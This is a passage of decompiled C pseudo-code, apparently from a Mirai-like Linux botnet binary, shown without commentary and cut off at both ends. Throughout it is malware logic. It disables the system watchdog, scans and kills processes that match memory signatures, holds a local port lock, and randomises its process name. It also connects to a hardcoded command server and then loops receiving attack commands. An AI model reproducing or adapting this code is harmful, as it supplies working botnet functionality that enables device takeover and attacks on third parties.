          if ((byte)(*(char *)(iVar5 + 0x13) - 0x30U) < 10) {
            iVar5 = iVar5 + 0x13;
            iVar7 = FUN_08052bd0(iVar5);
            local_20f0 = local_20f0 + 1;
            if (iVar6 < iVar7) {
              iVar2 = FUN_080530dc(0);
              FUN_0804fcd0(6);
              FUN_0804fcd0(7);
              uVar4 = FUN_0804fc20(6,0);
              iVar6 = FUN_08050640(local_84,uVar4);
              iVar8 = FUN_08050640(local_84 + iVar6,iVar5);
              uVar4 = FUN_0804fc20(7,0);
              FUN_08050640(local_84 + iVar6 + iVar8,uVar4);
              uVar4 = FUN_0804fc20(6,0);
              iVar6 = FUN_08050640(local_c4,uVar4);
              puVar17 = local_c4 + iVar6;
              iVar5 = FUN_08050640(puVar17,iVar5);
              uVar4 = FUN_0804fc20(0xb,0);
              FUN_08050640(puVar17 + iVar5,uVar4);
              FUN_0804fc50(6);
              FUN_0804fc50(7);
              puVar20 = local_10c4;
              iVar5 = FUN_080531a0(local_84,puVar20,0xfff);
              iVar6 = iVar7;
              if (iVar5 != -1) {
                local_10c4[iVar5] = 0;
                puVar17 = puVar20;
                FUN_0804fcd0(10);
                uVar4 = FUN_0804fc20(10,0);
                iVar5 = FUN_08050900(local_10c4,iVar5 + -1,uVar4);
                if (iVar5 != -1) {
                  FUN_08053210(local_10c4);
                  FUN_08052a70(iVar7,9);
                }
                FUN_0804fc50(10);
                iVar5 = FUN_08053160();
                if (((iVar7 == iVar5) || (iVar5 = FUN_0805316c(), iVar7 == iVar5)) ||
                   (uVar4 = FUN_08050980(local_10c4,DAT_08055694,iVar5,iVar5), (char)uVar4 != '\0'))
                goto LAB_0804e130;
                iVar5 = FUN_08050ef8(local_10c4,0,uVar4,uVar4);
                if (iVar5 == -1) {
                  FUN_08052a70(iVar7,9,local_10c4,local_10c4);
                }
                FUN_08053125(iVar5);
              }
              iVar5 = FUN_08050ef8(local_84,0,puVar17,puVar17);
              uVar4 = extraout_ECX_00;
              if (iVar5 != -1) {
                FUN_0804fcd0(0xc);
                FUN_0804fcd0(0xd);
                FUN_0804fcd0(0xe);
                FUN_0804fcd0(0xf);
                FUN_0804fcd0(0x10);
                iVar8 = FUN_0804fc20(0xc,&local_14);
                iVar9 = FUN_0804fc20(0xd,&local_18);
                iVar10 = FUN_0804fc20(0xe,&local_1c);
                iVar11 = FUN_0804fc20(0xf,&local_20);
                uVar12 = FUN_0804fc20(0x10,&local_24);
                uVar14 = uVar12;
                while (iVar13 = FUN_08053178(iVar5,local_20c4,0x1000,uVar14), 0 < iVar13) {
                  if (local_14 <= iVar13) {
                    iVar16 = iVar13 + -1;
                    pbVar15 = local_20c4;
                    if (iVar16 != -1) {
                      iVar18 = 0;
                      do {
                        if (*pbVar15 == *(byte *)(iVar8 + iVar18)) {
                          iVar18 = iVar18 + 1;
                          if (local_14 == iVar18) goto LAB_0804e5aa;
                        }
                        else {
                          iVar18 = 0;
                        }
                        iVar16 = iVar16 + -1;
                        pbVar15 = pbVar15 + 1;
                      } while (iVar16 != -1);
                    }
                  }
                  if (local_18 <= iVar13) {
                    iVar16 = 0;
                    pbVar15 = local_20c4;
                    iVar18 = iVar13;
                    while (iVar18 = iVar18 + -1, iVar18 != -1) {
                      if (*pbVar15 == *(byte *)(iVar9 + iVar16)) {
                        iVar16 = iVar16 + 1;
                        if (local_18 == iVar16) goto LAB_0804e5aa;
                      }
                      else {
                        iVar16 = 0;
                      }
                      pbVar15 = pbVar15 + 1;
                    }
                  }
                  if (local_1c <= iVar13) {
                    iVar16 = 0;
                    pbVar15 = local_20c4;
                    iVar18 = iVar13;
                    while (iVar18 = iVar18 + -1, iVar18 != -1) {
                      if (*pbVar15 == *(byte *)(iVar10 + iVar16)) {
                        iVar16 = iVar16 + 1;
                        if (local_1c == iVar16) goto LAB_0804e5aa;
                      }
                      else {
                        iVar16 = 0;
                      }
                      pbVar15 = pbVar15 + 1;
                    }
                  }
                  uVar14 = local_20;
                  if ((int)local_20 <= iVar13) {
                    iVar16 = iVar13 + -1;
                    pbVar15 = local_20c4;
                    if (iVar16 != -1) {
                      uVar19 = 0;
                      do {
                        uVar14 = (uint)*pbVar15;
                        if (*pbVar15 == *(byte *)(iVar11 + uVar19)) {
                          uVar19 = uVar19 + 1;
                          if (local_20 == uVar19) goto LAB_0804e5aa;
                        }
                        else {
                          uVar19 = 0;
                        }
                        pbVar15 = pbVar15 + 1;
                        iVar16 = iVar16 + -1;
                      } while (iVar16 != -1);
                    }
                  }
                  if (local_24 <= iVar13) {
                    pbVar15 = local_20c4;
                    iVar16 = 0;
                    while (iVar13 = iVar13 + -1, iVar13 != -1) {
                      uVar14 = (uint)*pbVar15;
                      if (*pbVar15 == *(byte *)(uVar12 + iVar16)) {
                        iVar16 = iVar16 + 1;
                        if (local_24 == iVar16) goto LAB_0804e5aa;
                        pbVar15 = pbVar15 + 1;
                      }
                      else {
                        iVar16 = 0;
                        pbVar15 = pbVar15 + 1;
                      }
                    }
                  }
                }
                FUN_0804fc50(0xc);
                FUN_0804fc50(0xd);
                FUN_0804fc50(0xe);
                FUN_0804fc50(0xf);
                FUN_0804fc50(0x10);
                FUN_08053125(iVar5);
                uVar4 = extraout_ECX_02;
              }
              goto LAB_0804e5fc;
            }
            iVar5 = FUN_080530dc(0);
            if (iVar5 - iVar2 < 0x259) {
              if ((400 < iVar7) && (local_20f0 == (local_20f0 / 10) * 10)) {
                FUN_080531dc(1);
              }
            }
            else {
              iVar6 = 400;
            }
          }
          goto LAB_0804e130;
        }
        FUN_08050ae4(iVar3);
      }
    }
  }
  return;
LAB_0804e5aa:
  FUN_0804fc50(0xc);
  FUN_0804fc50(0xd);
  FUN_0804fc50(0xe);
  FUN_0804fc50(0xf);
  FUN_0804fc50(0x10);
  FUN_08053125(iVar5);
  FUN_08052a70(iVar7,9);
  uVar4 = extraout_ECX_01;
LAB_0804e5fc:
  FUN_080506b0(local_84,0x40,uVar4,uVar4);
  FUN_080506b0(local_c4,0x40);
  FUN_080531dc(1);
  goto LAB_0804e130;
}



void FUN_0804e6e0(void)

{
  undefined2 uVar1;
  uint uVar2;
  undefined4 *puVar3;
  int *piVar4;
  undefined4 uVar5;
  undefined8 uVar6;
  undefined2 local_18;
  undefined2 local_16;
  undefined4 local_14;
  undefined4 local_8;
  
  local_8 = 1;
  DAT_08055070 = FUN_08052834(2,1,0);
  if (DAT_08055070 != -1) {
    FUN_080527e0(DAT_08055070,1,2,&local_8,4);
    uVar2 = FUN_08050d80(DAT_08055070,3,0);
    FUN_08050d80(DAT_08055070,4,uVar2 | 0x800);
    local_18 = 2;
    local_14 = DAT_0805569c;
    if (DAT_0805507c != '\0') {
      local_14 = FUN_08052518(0x7f000001);
    }
    local_16 = FUN_08052544(0xbbe5);
    puVar3 = (undefined4 *)FUN_08050d40();
    *puVar3 = 0;
    uVar6 = FUN_080523c4(DAT_08055070,&local_18,0x10);
    uVar5 = (undefined4)((ulonglong)uVar6 >> 0x20);
    if ((int)uVar6 == -1) {
      piVar4 = (int *)FUN_08050d40();
      if (*piVar4 == 99) {
        DAT_0805507c = '\0';
      }
      local_18 = 2;
      local_14 = 0;
      local_16 = FUN_08052544(0xbbe5);
      FUN_08052418(DAT_08055070,&local_18,0x10);
      FUN_080531dc(5);
      FUN_08053125(DAT_08055070);
      uVar1 = FUN_08052544(0xbbe5);
      FUN_0804d8d0(uVar1);
      FUN_0804e6e0();
      return;
    }
    FUN_08052664(DAT_08055070,1,uVar5,uVar5);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0804e850(void)

{
  int iVar1;
  undefined4 uVar2;
  byte *pbVar3;
  uint uVar4;
  undefined2 *puVar5;
  undefined4 uStack_c;
  
  FUN_0804fcd0(3);
  uVar2 = FUN_0804fc20(3,0);
  pbVar3 = (byte *)FUN_0804f700(uVar2);
  FUN_0804fc50(3);
  if (pbVar3 != (byte *)0x0) {
    iVar1 = *(int *)(pbVar3 + 4);
    uVar4 = FUN_0804f450();
    _DAT_080556a4 = *(undefined4 *)(iVar1 + (uVar4 % (uint)*pbVar3) * 4);
    FUN_0804f6c0(pbVar3);
    FUN_0804fcd0(4);
    puVar5 = (undefined2 *)FUN_0804fc20(4,0);
    _DAT_080556a2 = *puVar5;
    FUN_0804fc50(4);
  }
  return uStack_c;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0804e8e0(int param_1,int *param_2)

{
  byte bVar1;
  byte bVar2;
  uint uVar3;
  char cVar4;
  undefined uVar5;
  ushort uVar6;
  int iVar7;
  undefined4 uVar8;
  uint uVar9;
  undefined *puVar10;
  int *piVar11;
  undefined4 *puVar12;
  int iVar13;
  undefined4 extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_ECX_02;
  uint extraout_ECX_03;
  uint extraout_ECX_04;
  uint extraout_ECX_05;
  uint extraout_ECX_06;
  uint extraout_ECX_07;
  uint extraout_ECX_08;
  uint extraout_ECX_09;
  uint extraout_ECX_10;
  uint extraout_ECX_11;
  byte bVar14;
  undefined *puVar15;
  undefined *puVar16;
  code **ppcVar17;
  code **ppcVar18;
  undefined8 uVar19;
  uint auStackY_694 [5];
  undefined4 in_stack_fffff984;
  undefined auStack_670 [8];
  undefined8 local_668;
  int *local_65c;
  int local_658;
  int local_654 [2];
  byte local_649;
  undefined4 local_1c4;
  undefined local_1c0 [124];
  undefined local_144 [4];
  undefined local_140 [124];
  code *local_c4;
  int local_c0;
  int local_bc;
  int local_b8;
  int local_b4;
  int local_b0;
  int local_ac;
  undefined local_9e [32];
  undefined local_7e [12];
  undefined auStack_72 [20];
  undefined local_5e;
  undefined local_5d;
  undefined local_5c;
  undefined local_5b;
  undefined local_5a;
  undefined local_59;
  undefined local_58;
  undefined local_57;
  undefined local_56;
  undefined local_55;
  undefined local_54;
  undefined local_53;
  undefined local_52;
  undefined local_51;
  undefined local_50;
  undefined local_4f;
  undefined local_4e;
  undefined local_4d;
  undefined local_3c;
  undefined local_3b;
  undefined local_3a;
  undefined local_39;
  undefined local_38;
  undefined local_37;
  undefined local_36;
  undefined local_35;
  undefined local_34;
  undefined local_33;
  undefined local_32;
  undefined local_31;
  int local_30 [5];
  ushort local_1a;
  undefined4 *puStack_18;
  
  puStack_18 = &param_1;
  local_65c = param_2;
  local_658 = param_1;
  FUN_08053210(*param_2);
  puVar10 = local_144;
  FUN_08052b28(local_144);
  FUN_08052ae4(local_144,2);
  FUN_08052ba0(0,local_144,0);
  FUN_08052b3c(0x11,1);
  FUN_08052b3c(5,&LAB_0804e6d0);
  iVar7 = FUN_08050ef8("/dev/watchdog",2);
  if ((iVar7 != -1) ||
     (iVar7 = FUN_08050ef8("/dev/misc/watchdog",2,in_stack_fffff984,in_stack_fffff984), iVar7 != -1)
     ) {
    local_30[3] = 1;
    FUN_08052204(iVar7,0x80045704,local_30 + 3,puVar10);
    FUN_08053125(iVar7);
  }
  FUN_08053108(&DAT_080546ad);
  DAT_0805569c = FUN_08050870();
  _DAT_080556a0 = 2;
  _DAT_080556a4 = FUN_08052518(0x41deca35);
  _DAT_080556a2 = FUN_08052544(0x50);
  iVar7 = *local_65c;
  ppcVar17 = (code **)&PTR_FUN_08054760;
  ppcVar18 = &local_c4;
  for (iVar13 = 9; iVar13 != 0; iVar13 = iVar13 + -1) {
    *ppcVar18 = *ppcVar17;
    ppcVar17 = ppcVar17 + 1;
    ppcVar18 = ppcVar18 + 1;
  }
  local_5e = 0x2f;
  local_5d = 0x2e;
  local_5c = 0;
  local_5b = 0x76;
  local_5a = 100;
  local_59 = 0;
  local_58 = 0x48;
  local_57 = 0x72;
  local_56 = 0;
  local_55 = 0x6c;
  local_54 = 0x65;
  local_53 = 0;
  local_52 = 0x65;
  local_51 = 0x70;
  local_50 = 0;
  local_4f = 0;
  local_4e = 0x72;
  local_4d = 0;
  if (local_c4 + local_ac + local_b0 + local_b4 + local_b8 + local_bc + local_c0 != (code *)0x0) {
    local_3c = 0x2e;
    local_3b = 0x2f;
    iVar13 = FUN_08050620(iVar7);
    local_649 = *(byte *)(iVar7 + (int)(2 % (longlong)iVar13)) ^ 0xff;
    local_3a = local_5a;
    local_39 = local_5b;
    iVar13 = FUN_08050620(iVar7);
    bVar14 = *(byte *)(iVar7 + (int)(4 % (longlong)iVar13));
    local_38 = local_57;
    local_37 = local_58;
    iVar13 = FUN_08050620(iVar7);
    bVar1 = *(byte *)(iVar7 + (int)(6 % (longlong)iVar13));
    local_36 = local_54;
    local_35 = local_55;
    iVar13 = FUN_08050620(iVar7);
    bVar2 = *(byte *)(iVar7 + (int)(8 % (longlong)iVar13));
    local_34 = local_51;
    local_33 = local_52;
    iVar13 = FUN_08050620(iVar7);
    cVar4 = (bVar14 ^ 0xff) + 0xaf + local_649;
    bVar14 = *(byte *)(iVar7 + (int)(10 % (longlong)iVar13));
    local_32 = local_4e;
    local_31 = local_4f;
    iVar13 = FUN_08050620(iVar7);
    bVar14 = (*(byte *)(iVar7 + (int)(0xc % (longlong)iVar13)) ^ 0xff) +
             cVar4 + (bVar1 ^ 0xff) + (bVar2 ^ 0xff) + (bVar14 ^ 0xff);
    (*(&local_c4)
      [(byte)(bVar14 + ((byte)((uint)bVar14 +
                               (uint)(ushort)((ushort)bVar14 * 8 - (ushort)bVar14) * 8 >> 8) >> 1) *
                       -9)])();
    cVar4 = FUN_08050980(iVar7,&local_3c);
    FUN_080506b0(&local_5e,0x12);
    FUN_080506b0(&local_3c,0xc);
    if (cVar4 != '\0') {
      FUN_08052a8c(5);
    }
  }
  FUN_0804e6e0();
  uVar8 = FUN_0804f490();
  FUN_080506b0(local_9e,0x20,uVar8,uVar8);
  if ((local_658 == 2) && (iVar7 = FUN_08050620(local_65c[1]), iVar7 < 0x20)) {
    FUN_08050640(local_9e,local_65c[1],iVar7,iVar7);
    uVar8 = FUN_08050620(local_65c[1]);
    FUN_080506b0(local_65c[1],uVar8);
  }
  uVar9 = FUN_0804f450();
  iVar7 = (uVar9 & 3) * 4;
  FUN_0804f4d0(local_7e,iVar7 + 0xc,extraout_ECX,extraout_ECX);
  auStack_72[iVar7] = 0;
  FUN_08050640(*local_65c,local_7e);
  uVar9 = FUN_0804f450();
  iVar7 = (uVar9 % 6) * 4;
  FUN_0804f4d0(local_7e,iVar7 + 0xc);
  auStack_72[iVar7] = 0;
  FUN_08051008(0xf,local_7e);
  FUN_0804fcd0(2);
  uVar8 = FUN_0804fc20(2,local_30 + 4);
  FUN_08053228(1,uVar8,local_30[4]);
  FUN_08053228(1,&DAT_080546e7,1);
  FUN_0804fc50(2);
  iVar7 = FUN_08052955();
  if (0 < iVar7) {
    return 0;
  }
  local_654[0] = FUN_080531c4();
  FUN_08053125(0);
  FUN_08053125(1);
  FUN_08053125(2);
  FUN_0804a490();
  FUN_0804df10();
  local_654[1] = 0;
  puVar10 = local_1c0;
  puVar15 = auStack_670;
  uVar9 = extraout_ECX_00;
LAB_0804ee74:
  do {
    while( true ) {
      do {
        do {
          uVar3 = DAT_08055070;
          *(undefined4 *)(puVar10 + -4) = 0;
          puVar10 = puVar10 + 4;
        } while (puVar10 != local_140);
        puVar10 = puVar15 + 0x430;
        do {
          *(undefined4 *)(puVar10 + -4) = 0;
          puVar10 = puVar10 + 4;
        } while (puVar10 != local_1c0);
        if (DAT_08055070 != 0xffffffff) {
          uVar9 = DAT_08055070 & 0x1f;
          *(uint *)(puVar15 + (DAT_08055070 >> 5) * 4 + 0x4ac) =
               *(uint *)(puVar15 + (DAT_08055070 >> 5) * 4 + 0x4ac) | 1 << (sbyte)uVar9;
        }
        if (DAT_08055074 == 0xffffffff) {
          *(uint *)(puVar15 + -4) = uVar9;
          *(undefined4 *)(puVar15 + -8) = 0;
          *(undefined4 *)(puVar15 + -0xc) = 1;
          *(undefined4 *)(puVar15 + -0x10) = 2;
          *(undefined4 *)(puVar15 + -0x14) = 0x804f10f;
          uVar19 = FUN_08052834();
          DAT_08055074 = (uint)uVar19;
          if (DAT_08055074 != 0xffffffff) {
            *(int *)(puVar15 + -4) = (int)((ulonglong)uVar19 >> 0x20);
            *(undefined4 *)(puVar15 + -8) = 0;
            *(undefined4 *)(puVar15 + -0xc) = 3;
            *(uint *)(puVar15 + -0x10) = DAT_08055074;
            *(undefined4 *)(puVar15 + -0x14) = 0x804f12b;
            uVar9 = FUN_08050d80();
            *(uint *)(puVar15 + -8) = uVar9 | 0x800;
            *(undefined4 *)(puVar15 + -0xc) = 4;
            *(uint *)(puVar15 + -0x10) = DAT_08055074;
            *(undefined4 *)(puVar15 + -0x14) = 0x804f13f;
            FUN_08050d80();
            if (PTR_FUN_08055078 != (undefined *)0x0) {
              *(undefined4 *)(puVar15 + -4) = 0x804f14d;
              (*(code *)PTR_FUN_08055078)();
            }
            DAT_08055104 = '\x01';
            *(uint *)(puVar15 + -4) = uVar3;
            *(undefined4 *)(puVar15 + -8) = 0x10;
            *(undefined **)(puVar15 + -0xc) = &DAT_080556a0;
            *(uint *)(puVar15 + -0x10) = DAT_08055074;
            *(undefined4 *)(puVar15 + -0x14) = 0x804f168;
            FUN_08052418();
          }
        }
        if (DAT_08055104 == '\0') {
          *(uint *)(puVar15 + (DAT_08055074 >> 5) * 4 + 0x4ac) =
               *(uint *)(puVar15 + (DAT_08055074 >> 5) * 4 + 0x4ac) |
               1 << ((byte)DAT_08055074 & 0x1f);
        }
        else {
          *(uint *)(puVar15 + (DAT_08055074 >> 5) * 4 + 0x42c) =
               *(uint *)(puVar15 + (DAT_08055074 >> 5) * 4 + 0x42c) |
               1 << ((byte)DAT_08055074 & 0x1f);
        }
        uVar9 = DAT_08055074;
        if ((int)DAT_08055074 < (int)DAT_08055070) {
          uVar9 = DAT_08055070;
        }
        *(undefined4 *)(puVar15 + 0x644) = 0;
        *(undefined4 *)(puVar15 + 0x640) = 10;
        *(undefined **)(puVar15 + -0x10) = puVar15 + 0x640;
        *(undefined4 *)(puVar15 + -0x14) = 0;
        *(undefined **)(puVar15 + -0x18) = puVar15 + 0x42c;
        *(undefined **)(puVar15 + -0x1c) = puVar15 + 0x4ac;
        *(uint *)(puVar15 + -0x20) = uVar9 + 1;
        *(undefined4 *)(puVar15 + -0x24) = 0x804ef47;
        iVar7 = FUN_080529e0();
        puVar10 = local_1c0;
        uVar9 = extraout_ECX_01;
      } while (iVar7 == -1);
      if (iVar7 == 0) {
        iVar7 = *(int *)(puVar15 + 0x20);
        *(undefined2 *)(puVar15 + 0x656) = 0;
        *(int *)(puVar15 + 0x20) = *(int *)(puVar15 + 0x20) + 1;
        if (iVar7 % 6 == 0) {
          *(undefined4 *)(puVar15 + -4) = 0x4000;
          *(undefined4 *)(puVar15 + -8) = 2;
          *(undefined **)(puVar15 + -0xc) = puVar15 + 0x656;
          *(uint *)(puVar15 + -0x10) = DAT_08055074;
          *(undefined4 *)(puVar15 + -0x14) = 0x804f191;
          FUN_08052768();
        }
      }
      uVar3 = DAT_08055070;
      if ((DAT_08055070 == 0xffffffff) ||
         ((*(uint *)(puVar15 + (DAT_08055070 >> 5) * 4 + 0x4ac) >> (sbyte)(DAT_08055070 & 0x1f) & 1)
          == 0)) break;
      *(undefined4 *)(puVar15 + 0x64c) = 0x10;
      *(uint *)(puVar15 + -4) = DAT_08055070 & 0x1f;
      *(undefined **)(puVar15 + -8) = puVar15 + 0x64c;
      *(undefined **)(puVar15 + -0xc) = puVar15 + 0x624;
      puVar16 = puVar15 + -0x10;
      *(uint *)(puVar15 + -0x10) = DAT_08055070;
      *(undefined4 *)(puVar15 + -0x14) = 0x804f261;
      FUN_0805236c();
      *(undefined4 *)(puVar15 + -0x14) = 0x804f266;
      FUN_0804d8b0();
      *(undefined4 *)(puVar15 + -0x14) = 0x804f26b;
      FUN_0804a010();
      *(undefined4 *)(puVar15 + -0xc) = 9;
      *(int *)(puVar15 + 0x1c) = -*(int *)(puVar15 + 0x1c);
      *(undefined4 *)(puVar15 + -0x10) = *(undefined4 *)(puVar15 + 0x1c);
      *(undefined4 *)(puVar15 + -0x14) = 0x804f27d;
      FUN_08052a70();
      *(undefined4 *)(puVar15 + -0x10) = 0;
      *(undefined4 *)(puVar15 + -0x14) = 0x804f289;
      FUN_08050d4d();
LAB_0804f289:
      *(undefined **)(puVar16 + -0x10) = puVar16 + 0x5d2;
      *(undefined4 *)(puVar16 + -0x14) = 0x804f299;
      uVar5 = FUN_08050620();
      puVar16[0x656] = uVar5;
      *(undefined4 *)(puVar16 + -0x14) = 0x804f2a5;
      DAT_0805569c = FUN_08050870();
      *(undefined4 *)(puVar16 + -0x14) = 0x4000;
      *(undefined4 *)(puVar16 + -0x18) = 4;
      *(undefined **)(puVar16 + -0x1c) = &DAT_0805473f;
      *(uint *)(puVar16 + -0x20) = DAT_08055074;
      *(undefined4 *)(puVar16 + -0x24) = 0x804f2c2;
      FUN_08052768();
      *(undefined4 *)(puVar16 + -4) = 0x4000;
      *(undefined4 *)(puVar16 + -8) = 1;
      *(undefined **)(puVar16 + -0xc) = puVar16 + 0x656;
      *(uint *)(puVar16 + -0x10) = DAT_08055074;
      *(undefined4 *)(puVar16 + -0x14) = 0x804f2e0;
      FUN_08052768();
      puVar15 = puVar16;
      uVar9 = extraout_ECX_08;
      if (puVar16[0x656] != 0) {
        *(undefined4 *)(puVar16 + -4) = 0x4000;
        *(uint *)(puVar16 + -8) = (uint)(byte)puVar16[0x656];
        *(undefined **)(puVar16 + -0xc) = puVar16 + 0x5d2;
        *(uint *)(puVar16 + -0x10) = DAT_08055074;
        *(undefined4 *)(puVar16 + -0x14) = 0x804f311;
        FUN_08052768();
        uVar9 = extraout_ECX_09;
      }
    }
    if (DAT_08055104 == '\0') break;
    DAT_08055104 = '\0';
    if ((*(uint *)(puVar15 + (DAT_08055074 >> 5) * 4 + 0x42c) >> ((byte)DAT_08055074 & 0x1f) & 1) ==
        0) {
      if (DAT_08055074 != 0xffffffff) {
        *(uint *)(puVar15 + -0x10) = DAT_08055074;
        *(undefined4 *)(puVar15 + -0x14) = 0x804efea;
        FUN_08053125();
      }
      goto LAB_0804efed;
    }
    *(undefined4 *)(puVar15 + 0x64c) = 0;
    *(undefined4 *)(puVar15 + 0x648) = 4;
    *(undefined **)(puVar15 + -0x10) = puVar15 + 0x648;
    *(undefined **)(puVar15 + -0x14) = puVar15 + 0x64c;
    *(undefined4 *)(puVar15 + -0x18) = 4;
    *(undefined4 *)(puVar15 + -0x1c) = 1;
    *(uint *)(puVar15 + -0x20) = DAT_08055074;
    *(undefined4 *)(puVar15 + -0x24) = 0x804f1cc;
    FUN_080524c4();
    puVar16 = puVar15;
    if (*(int *)(puVar15 + 0x64c) == 0) goto LAB_0804f289;
    *(uint *)(puVar15 + -0x10) = DAT_08055074;
    *(undefined4 *)(puVar15 + -0x14) = 0x804f1ec;
    FUN_08053125();
    DAT_08055074 = 0xffffffff;
    *(undefined4 *)(puVar15 + -0x14) = 0x804f1fb;
    uVar9 = FUN_0804f450();
    *(ulonglong *)(puVar15 + 8) = (ulonglong)uVar9 * 0xcccccccd;
    *(uint *)(puVar15 + -0x10) = uVar9 + (*(uint *)(puVar15 + 0xc) >> 3) * -10 + 1;
    *(undefined4 *)(puVar15 + -0x14) = 0x804f226;
    FUN_080531dc();
    uVar9 = extraout_ECX_07;
  } while( true );
  uVar9 = DAT_08055074;
  if ((DAT_08055074 == 0xffffffff) ||
     (uVar9 = DAT_08055074 & 0x1f,
     (*(uint *)(puVar15 + (DAT_08055074 >> 5) * 4 + 0x4ac) >> (sbyte)uVar9 & 1) == 0))
  goto LAB_0804ee74;
  *(undefined4 *)(puVar15 + -4) = 0x804f095;
  puVar12 = (undefined4 *)FUN_08050d40();
  *puVar12 = 0;
  *(undefined4 *)(puVar15 + -4) = 0x4002;
  *(undefined4 *)(puVar15 + -8) = 2;
  *(undefined **)(puVar15 + -0xc) = puVar15 + 0x656;
  *(uint *)(puVar15 + -0x10) = DAT_08055074;
  *(undefined4 *)(puVar15 + -0x14) = 0x804f0b6;
  iVar7 = FUN_080526f0();
  if (iVar7 != -1) {
    if (iVar7 == 0) goto LAB_0804f31f;
    if (*(ushort *)(puVar15 + 0x656) == 0) {
      *(undefined4 *)(puVar15 + -4) = 0x4000;
      *(undefined4 *)(puVar15 + -8) = 2;
      *(undefined **)(puVar15 + -0xc) = puVar15 + 0x656;
      *(uint *)(puVar15 + -0x10) = DAT_08055074;
      *(undefined4 *)(puVar15 + -0x14) = 0x804f0f5;
      FUN_080526f0();
      uVar9 = extraout_ECX_06;
      goto LAB_0804ee74;
    }
    *(uint *)(puVar15 + -0x10) = (uint)*(ushort *)(puVar15 + 0x656);
    *(undefined4 *)(puVar15 + -0x14) = 0x804f34c;
    uVar6 = FUN_080526e4();
    *(ushort *)(puVar15 + 0x656) = uVar6;
    if (0x400 < uVar6) {
      *(uint *)(puVar15 + -0x10) = DAT_08055074;
      *(undefined4 *)(puVar15 + -0x14) = 0x804f432;
      FUN_08053125();
      DAT_08055074 = 0xffffffff;
    }
    *(undefined4 *)(puVar15 + -4) = 0x804f366;
    puVar12 = (undefined4 *)FUN_08050d40();
    *puVar12 = 0;
    *(undefined4 *)(puVar15 + -4) = 0x4002;
    *(uint *)(puVar15 + -8) = (uint)*(ushort *)(puVar15 + 0x656);
    *(undefined **)(puVar15 + -0xc) = puVar15 + 0x2c;
    *(uint *)(puVar15 + -0x10) = DAT_08055074;
    *(undefined4 *)(puVar15 + -0x14) = 0x804f38f;
    iVar7 = FUN_080526f0();
    if (iVar7 != -1) {
      if (iVar7 != 0) {
        *(undefined4 *)(puVar15 + -4) = 0x4000;
        *(undefined4 *)(puVar15 + -8) = 2;
        *(undefined **)(puVar15 + -0xc) = puVar15 + 0x656;
        *(uint *)(puVar15 + -0x10) = DAT_08055074;
        *(undefined4 *)(puVar15 + -0x14) = 0x804f3b9;
        FUN_080526f0();
        *(uint *)(puVar15 + -0x10) = (uint)*(ushort *)(puVar15 + 0x656);
        *(undefined4 *)(puVar15 + -0x14) = 0x804f3cd;
        uVar6 = FUN_080526e4();
        *(ushort *)(puVar15 + 0x656) = uVar6;
        *(undefined4 *)(puVar15 + -0x14) = 0x4000;
        *(uint *)(puVar15 + -0x18) = (uint)uVar6;
        *(undefined **)(puVar15 + -0x1c) = puVar15 + 0x2c;
        *(uint *)(puVar15 + -0x20) = DAT_08055074;
        *(undefined4 *)(puVar15 + -0x24) = 0x804f3f0;
        FUN_080526f0();
        uVar9 = extraout_ECX_10;
        if (*(ushort *)(puVar15 + 0x656) != 0) {
          *(uint *)(puVar15 + -4) = uVar3;
          *(uint *)(puVar15 + -8) = uVar3;
          *(uint *)(puVar15 + -0xc) = (uint)*(ushort *)(puVar15 + 0x656);
          *(undefined **)(puVar15 + -0x10) = puVar15 + 0x2c;
          *(undefined4 *)(puVar15 + -0x14) = 0x804f416;
          FUN_0804a160();
          uVar9 = extraout_ECX_11;
        }
        goto LAB_0804ee74;
      }
      goto LAB_0804f31f;
    }
  }
  *(undefined4 *)(puVar15 + -4) = 0x804f040;
  piVar11 = (int *)FUN_08050d40();
  uVar9 = extraout_ECX_03;
  if (*piVar11 == 0xb) goto LAB_0804ee74;
  *(undefined4 *)(puVar15 + -4) = 0x804f04a;
  piVar11 = (int *)FUN_08050d40();
  uVar9 = extraout_ECX_04;
  if (*piVar11 == 0xb) goto LAB_0804ee74;
  *(undefined4 *)(puVar15 + -4) = 0x804f054;
  piVar11 = (int *)FUN_08050d40();
  uVar9 = extraout_ECX_05;
  if (*piVar11 == 4) goto LAB_0804ee74;
LAB_0804f31f:
  if (DAT_08055074 != 0xffffffff) {
    *(uint *)(puVar15 + -0x10) = DAT_08055074;
    *(undefined4 *)(puVar15 + -0x14) = 0x804f336;
    FUN_08053125();
  }
LAB_0804efed:
  DAT_08055074 = 0xffffffff;
  *(undefined4 *)(puVar15 + -0x10) = 1;
  *(undefined4 *)(puVar15 + -0x14) = 0x804f001;
  FUN_080531dc();
  uVar9 = extraout_ECX_02;
  goto LAB_0804ee74;
}



void FUN_0804f450(void)

{
  uint uVar1;
  
  uVar1 = DAT_08055108 << 0xb ^ DAT_08055108;
  DAT_08055108 = DAT_0805510c;
  DAT_0805510c = DAT_08055110;
  DAT_08055110 = DAT_08055114;
  DAT_08055114 = DAT_08055114 >> 0x13 ^ DAT_08055114 ^ uVar1 ^ uVar1 >> 8;
  return;
}



void FUN_0804f490(void)

{
  uint uVar1;
  uint uVar2;
  
  DAT_08055108 = FUN_080530dc(0);
  uVar1 = FUN_08053160();
  uVar2 = FUN_0805316c();
  DAT_0805510c = uVar2 ^ uVar1;
  DAT_08055110 = FUN_08052fd0();
  DAT_08055114 = DAT_08055110 ^ DAT_0805510c;
  return;
}



void FUN_0804f4d0(char *param_1,uint param_2)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  uint local_44;
  undefined4 local_31 [8];
  
  puVar4 = (undefined4 *)"abcdefghijklmnopqrstuvw012345678";
  puVar5 = local_31;
  for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar5 = *puVar4;
    puVar4 = puVar4 + 1;
    puVar5 = puVar5 + 1;
  }
  *(undefined *)puVar5 = 0;
  if (0 < (int)param_2) {
    local_44 = DAT_0805510c;
    uVar1 = local_44;
    do {
      local_44 = uVar1;
      DAT_0805510c = DAT_08055110;
      DAT_08055110 = DAT_08055114;
      if (param_2 < 4) {
        param_2 = param_2 - 1;
        uVar1 = DAT_08055108 << 0xb ^ DAT_08055108;
        DAT_08055114 = DAT_08055110 >> 0x13 ^ DAT_08055110 ^ uVar1 ^ uVar1 >> 8;
        *param_1 = (char)DAT_08055114 -
